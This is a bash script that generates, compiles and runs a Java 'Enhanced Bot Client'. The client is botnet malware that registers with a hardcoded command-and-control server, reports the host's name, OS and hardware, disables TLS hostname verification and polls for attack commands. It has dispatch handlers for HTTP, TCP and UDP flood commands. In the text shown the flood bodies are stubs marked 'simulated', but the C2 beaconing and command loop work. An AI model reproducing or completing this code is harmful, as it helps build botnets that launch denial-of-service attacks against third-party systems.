#!/bin/bash
# Auto-compile and run Java bot client
# Save this as run_java_bot.sh

echo "=========================================="
echo "  JAVA BOT CLIENT - AUTO SETUP"
echo "=========================================="

# Create the Java client file
cat > EnhancedBotClient.java << 'EOF'
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicInteger;
import java.security.*;
import javax.net.ssl.*;
import org.json.*;

public class EnhancedBotClient {
    
    private static final String SERVER_URL = "https://c2-server-io.onrender.com";
    private static final int MAX_RETRY_DELAY = 300;
    
    private String botId;
    private boolean running = true;
    private boolean approved = false;
    private Set<String> activeAttacks = Collections.synchronizedSet(new HashSet<>());
    private int connectionRetries = 0;
    
    private Map<String, Object> specs = new HashMap<>();
    private Map<String, Object> stats = new HashMap<>();
    private List<String> userAgents = new ArrayList<>();
    private ExecutorService threadPool = Executors.newCachedThreadPool();
    
    public EnhancedBotClient() {
        this.botId = generateBotId();
        initDefaultUserAgents();
        initSpecs();
        displayBanner();
    }
    
    private void initDefaultUserAgents() {
        userAgents.add("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
        userAgents.add("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0");
    }
    
    private void initSpecs() {
        specs.put("bot_id", botId);
        specs.put("cpu_cores", Runtime.getRuntime().availableProcessors());
        specs.put("ram_gb", String.format("%.1f", Runtime.getRuntime().totalMemory() / (1024.0 * 1024 * 1024)));
        specs.put("os", System.getProperty("os.name"));
        specs.put("hostname", getHostname());
        
        Map<String, Boolean> capabilities = new HashMap<>();
        capabilities.put("http", true);
        capabilities.put("tcp", true);
        capabilities.put("udp", true);
        capabilities.put("resource_optimized", true);
        capabilities.put("auto_connect", true);
        capabilities.put("java", true);
        
        specs.put("capabilities", capabilities);
        
        stats.put("total_attacks", 0);
        stats.put("successful_attacks", 0);
        stats.put("total_requests", 0);
        stats.put("uptime", System.currentTimeMillis());
    }
    
    private String generateBotId() {
        try {
            String uniqueId = System.getProperty("user.name") + 
                             System.getProperty("os.name") + 
                             System.currentTimeMillis();
            MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] hash = md.digest(uniqueId.getBytes());
            StringBuilder hex = new StringBuilder();
            for (byte b : hash) {
                hex.append(String.format("%02x", b));
            }
            return "JAVA-" + hex.toString().substring(0, 8).toUpperCase();
        } catch (Exception e) {
            return "JAVA-" + UUID.randomUUID().toString().substring(0, 8).toUpperCase();
        }
    }
    
    private String getHostname() {
        try {
            return InetAddress.getLocalHost().getHostName();
        } catch (Exception e) {
            return "unknown";
        }
    }
    
    private void displayBanner() {
        System.out.println("\n" + "=".repeat(60));
        System.out.println("  ENHANCED BOT CLIENT v3.0 - JAVA");
        System.out.println("=".repeat(60));
        System.out.printf("\n[+] BOT ID: %s\n", botId);
        System.out.printf("[+] CPU: %s cores\n", specs.get("cpu_cores"));
        System.out.printf("[+] RAM: %sGB\n", specs.get("ram_gb"));
        System.out.printf("[+] OS: %s\n", specs.get("os"));
        System.out.printf("[+] Hostname: %s\n", specs.get("hostname"));
        System.out.printf("[+] Server: %s\n", SERVER_URL);
        System.out.println("\n" + "=".repeat(60) + "\n");
    }
    
    private boolean checkInternetConnection() {
        try (Socket socket = new Socket()) {
            socket.connect(new InetSocketAddress("8.8.8.8", 53), 3000);
            return true;
        } catch (Exception e) {
            return false;
        }
    }
    
    private void waitForInternet() {
        System.out.println("\n[X] No internet connection detected");
        System.out.println("[...] Waiting for internet connection...");
        
        while (!checkInternetConnection()) {
            System.out.print("\r[...] Checking connection...");
            try {
                Thread.sleep(5000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            }
        }
        
        System.out.println("\n[OK] Internet connection restored!");
    }
    
    private int calculateRetryDelay() {
        int delay = (int) Math.min(5 * Math.pow(2, connectionRetries), MAX_RETRY_DELAY);
        return delay;
    }
    
    private String sendRequest(String endpoint, String method, String jsonBody) throws IOException {
        URL url = new URL(SERVER_URL + endpoint);
        HttpURLConnection conn;
        
        if (url.getProtocol().equals("https")) {
            HttpsURLConnection httpsConn = (HttpsURLConnection) url.openConnection();
            httpsConn.setHostnameVerifier((hostname, session) -> true);
            conn = httpsConn;
        } else {
            conn = (HttpURLConnection) url.openConnection();
        }
        
        conn.setRequestMethod(method);
        conn.setRequestProperty("Content-Type", "application/json");
        conn.setRequestProperty("Accept", "application/json");
        conn.setRequestProperty("User-Agent", "Java-Bot-Client/1.0");
        conn.setConnectTimeout(10000);
        conn.setReadTimeout(10000);
        
        if (jsonBody != null && method.equals("POST")) {
            conn.setDoOutput(true);
            try (OutputStream os = conn.getOutputStream()) {
                os.write(jsonBody.getBytes("utf-8"));
            }
        }
        
        int responseCode = conn.getResponseCode();
        if (responseCode == 200) {
            try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), "utf-8"))) {
                StringBuilder response = new StringBuilder();
                String responseLine;
                while ((responseLine = br.readLine()) != null) {
                    response.append(responseLine.trim());
                }
                return response.toString();
            }
        }
        return null;
    }
    
    private boolean checkApproval() throws IOException {
        try {
            Map<String, Object> data = new HashMap<>();
            data.put("bot_id", botId);
            data.put("specs", specs);
            data.put("stats", stats);
            
            String jsonBody = new JSONObject(data).toString();
            String response = sendRequest("/check_approval", "POST", jsonBody);
            
            if (response != null) {
                JSONObject jsonResponse = new JSONObject(response);
                connectionRetries = 0;
                return jsonResponse.getBoolean("approved");
            }
        } catch (Exception e) {
            throw new IOException("Connection failed: " + e.getMessage());
        }
        return false;
    }
    
    private List<Map<String, Object>> getCommands() throws IOException {
        try {
            String response = sendRequest("/commands/" + botId, "GET", null);
            if (response != null) {
                JSONObject jsonResponse = new JSONObject(response);
                JSONArray commandsArray = jsonResponse.getJSONArray("commands");
                
                List<Map<String, Object>> commands = new ArrayList<>();
                for (int i = 0; i < commandsArray.length(); i++) {
                    JSONObject cmd = commandsArray.getJSONObject(i);
                    Map<String, Object> command = new HashMap<>();
                    for (String key : cmd.keySet()) {
                        command.put(key, cmd.get(key));
                    }
                    commands.add(command);
                }
                connectionRetries = 0;
                return commands;
            }
        } catch (Exception e) {
            throw new IOException("Failed to get commands: " + e.getMessage());
        }
        return new ArrayList<>();
    }
    
    private void sendStatus(String status, String message) {
        try {
            stats.put("uptime", System.currentTimeMillis() - (Long) stats.get("uptime"));
            
            Map<String, Object> data = new HashMap<>();
            data.put("bot_id", botId);
            data.put("status", status);
            data.put("message", message);
            data.put("stats", stats);
            data.put("active_attacks", activeAttacks.size());
            
            String jsonBody = new JSONObject(data).toString();
            sendRequest("/status", "POST", jsonBody);
            connectionRetries = 0;
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    private void executeCommand(Map<String, Object> cmd) {
        String cmdType = (String) cmd.get("type");
        
        System.out.println("\n" + "=".repeat(60));
        System.out.println("[->] COMMAND: " + cmdType);
        System.out.println("=".repeat(60));
        
        try {
            switch (cmdType) {
                case "ping":
                    cmdPing();
                    break;
                case "http_flood":
                    cmdHttpFlood(cmd);
                    break;
                case "tcp_flood":
                    cmdTcpFlood(cmd);
                    break;
                case "udp_flood":
                    cmdUdpFlood(cmd);
                    break;
                case "sysinfo":
                    cmdSysinfo();
                    break;
                case "stop_all":
                    cmdStopAll();
                    break;
                default:
                    System.out.println("[!] Unknown command: " + cmdType);
            }
        } catch (Exception e) {
            System.out.println("[!] Error: " + e.getMessage());
            sendStatus("error", e.getMessage());
        }
    }
    
    private void cmdPing() {
        sendStatus("success", "pong");
        System.out.println("[OK] Pong!");
    }
    
    private void cmdHttpFlood(Map<String, Object> cmd) {
        try {
            String target = (String) cmd.get("target");
            int duration = ((Number) cmd.get("duration")).intValue();
            int threads = ((Number) cmd.get("threads")).intValue();
            String method = (String) cmd.getOrDefault("method", "GET");
            
            System.out.println("[*] HTTP FLOOD");
            System.out.println("    Target: " + target);
            System.out.println("    Method: " + method);
            System.out.println("    Duration: " + duration + "s");
            System.out.println("    Threads: " + threads);
            
            stats.put("total_attacks", ((Integer) stats.get("total_attacks")) + 1);
            sendStatus("running", method + " FLOOD: " + target);
            
            System.out.println("[+] Attack would start here...");
            Thread.sleep(2000);
            sendStatus("success", "HTTP flood simulated");
            
        } catch (Exception e) {
            System.out.println("[!] Error in flood: " + e.getMessage());
        }
    }
    
    private void cmdTcpFlood(Map<String, Object> cmd) {
        try {
            String target = (String) cmd.get("target");
            int duration = ((Number) cmd.get("duration")).intValue();
            int threads = ((Number) cmd.get("threads")).intValue();
            
            System.out.println("[*] TCP FLOOD");
            System.out.println("    Target: " + target);
            System.out.println("    Duration: " + duration + "s");
            System.out.println("    Threads: " + threads);
            
            stats.put("total_attacks", ((Integer) stats.get("total_attacks")) + 1);
            sendStatus("running", "TCP FLOOD: " + target);
            
            System.out.println("[+] Attack would start here...");
            Thread.sleep(2000);
            sendStatus("success", "TCP flood simulated");
            
        } catch (Exception e) {
            System.out.println("[!] Error in TCP flood: " + e.getMessage());
        }
    }
    
    private void cmdUdpFlood(Map<String, Object> cmd) {
        try {
            String target = (String) cmd.get("target");
            int duration = ((Number) cmd.get("duration")).intValue();
            int threads = ((Number) cmd.get("threads")).intValue();
            
            System.out.println("[*] UDP FLOOD");
            System.out.println("    Target: " + target);
            System.out.println("    Duration: " + duration + "s");
            System.out.println("    Threads: " + threads);
            
            stats.put("total_attacks", ((Integer) stats.get("total_attacks")) + 1);
            sendStatus("running", "UDP FLOOD: " + target);
            
            System.out.println("[+] Attack would start here...");
            Thread.sleep(2000);
            sendStatus("success", "UDP flood simulated");
            
        } catch (Exception e) {
            System.out.println("[!] Error in UDP flood: " + e.getMessage());
        }
    }
    
    private void cmdSysinfo() {
        StringBuilder info = new StringBuilder();
        info.append("CPU Cores: ").append(specs.get("cpu_cores")).append("\n");
        info.append("RAM: ").append(specs.get("ram_gb")).append("GB\n");
        info.append("OS: ").append(specs.get("os")).append("\n");
        info.append("Active Attacks: ").append(activeAttacks.size()).append("\n");
        info.append("Total Attacks: ").append(stats.get("total_attacks")).append("\n");
        info.append("Total Requests: ").append(String.format("%,d", stats.get("total_requests")));
        
        System.out.println("[*] System Info:\n" + info.toString());
        sendStatus("success", info.toString());
    }
    
    private void cmdStopAll() {
        System.out.println("[!] Stopping all attacks...");
        int count = activeAttacks.size();
        activeAttacks.clear();
        System.out.println("[OK] Stopped " + count + " attacks");
        sendStatus("success", "Stopped " + count);
    }
    
    public void run() {
        while (running) {
            try {
                if (!checkInternetConnection()) {
                    waitForInternet();
                    connectionRetries = 0;
                }
                
                System.out.println("\n[*] Connecting to server...");
                System.out.println("[*] Waiting for auto-approval...\n");
                
                approved = false;
                while (!approved) {
                    try {
                        if (!checkInternetConnection()) {
                            waitForInternet();
                            continue;
                        }
                        
                        if (checkApproval()) {
                            approved = true;
                            System.out.println("\n" + "=".repeat(60));
                            System.out.println("  BOT APPROVED! READY FOR OPERATIONS");
                            System.out.println("=".repeat(60) + "\n");
                            break;
                        } else {
                            System.out.print("\r[...] Waiting for approval...");
                            Thread.sleep(5000);
                        }
                    } catch (IOException e) {
                        connectionRetries++;
                        int delay = calculateRetryDelay();
                        
                        System.out.println("\n[X] Connection lost: " + e.getMessage());
                        System.out.println("[...] Retry " + connectionRetries + " - Waiting " + delay + "s...");
                        
                        for (int remaining = delay; remaining > 0; remaining--) {
                            if (!checkInternetConnection()) {
                                waitForInternet();
                                break;
                            }
                            System.out.print("\r[...] Reconnecting in " + remaining + "s");
                            Thread.sleep(1000);
                        }
                        
                        System.out.println("\n[->] Attempting to reconnect...");
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        return;
                    }
                }
                
                System.out.println("[+] Active. Listening for commands...\n");
                
                while (running && approved) {
                    try {
                        if (!checkInternetConnection()) {
                            System.out.println("\n[X] Internet connection lost");
                            waitForInternet();
                            approved = false;
                            break;
                        }
                        
                        List<Map<String, Object>> commands = getCommands();
                        for (Map<String, Object> cmd : commands) {
                            threadPool.submit(() -> executeCommand(cmd));
                        }
                        
                        Thread.sleep(5000);
                        
                    } catch (IOException e) {
                        connectionRetries++;
                        int delay = calculateRetryDelay();
                        
                        System.out.println("\n[X] Lost connection to server: " + e.getMessage());
                        System.out.println("[...] Retry " + connectionRetries + " - Waiting " + delay + "s...");
                        
                        for (int remaining = delay; remaining > 0; remaining--) {
                            if (!checkInternetConnection()) {
                                waitForInternet();
                                break;
                            }
                            System.out.print("\r[...] Reconnecting in " + remaining + "s");
                            Thread.sleep(1000);
                        }
                        
                        System.out.println("\n[->] Attempting to reconnect...");
                        approved = false;
                        break;
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        System.out.println("\n[!] Stopping...");
                        cmdStopAll();
                        running = false;
                        return;
                    }
                }
                
            } catch (Exception e) {
                System.out.println("\n[!] Error: " + e.getMessage());
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                    return;
                }
            }
        }
    }
    
    public static void main(String[] args) {
        System.out.println("\n" + "=".repeat(60));
        System.out.println("  ENHANCED BOT CLIENT - JAVA VERSION");
        System.out.println("=".repeat(60));
        
        try {
            EnhancedBotClient client = new EnhancedBotClient();
            client.run();
        } catch (Exception e) {
            System.out.println("\n[!] Fatal error: " + e.getMessage());
            System.exit(1);
        }
    }
}
EOF

echo "[+] Java client file created"

# Download JSON library if needed
if [ ! -f "json-20230227.jar" ]; then
    echo "[+] Downloading JSON library..."
    wget -q https://repo1.maven.org/maven2/org/json/json/20230227/json-20230227.jar
    echo "[✓] JSON library downloaded"
else
    echo "[✓] JSON library already exists"
fi

# Compile the Java client
echo "[+] Compiling Java client..."
javac -cp ".:json-20230227.jar" EnhancedBotClient.java

if [ $? -eq 0 ]; then
    echo "[✓] Compilation successful!"
    echo ""
    echo "=========================================="
    echo "  STARTING JAVA BOT CLIENT"
    echo "=========================================="
    echo "Server: https://c2-server-io.onrender.com"
    echo "Press Ctrl+C to stop"
    echo "=========================================="
    echo ""
    
    # Run the Java client
    java -cp ".:json-20230227.jar" EnhancedBotClient
else
    echo "[!] Compilation failed!"
    echo "Trying with simpler compilation..."
    
    # Try simpler compilation
    javac -cp ".:json-20230227.jar" EnhancedBotClient.java 2>&1 | head -20
    exit 1
fi
